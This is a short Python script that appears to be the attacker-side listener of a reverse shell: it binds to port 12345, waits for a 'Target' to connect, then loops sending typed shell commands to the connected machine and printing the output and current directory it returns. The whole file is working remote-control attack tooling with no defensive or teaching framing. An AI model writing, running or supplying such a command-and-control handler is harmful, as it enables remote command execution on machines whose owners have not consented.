import socket


buffer_size = 1024 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 12345))
s.listen(1)

print("Waiting for a connection...")

conn, addr = s.accept()

print("Target connected")

directory = conn.recv(buffer_size).decode()
separator = "<3"

while True:

    command = input(f"{directory} $> ")
    if not command.strip():
        # empty command
        continue

    conn.send(command.encode())

    if command.lower() == "bye":
        break

    command_result = conn.recv(buffer_size).decode()



    results, directory = command_result.split(separator)

    print(results)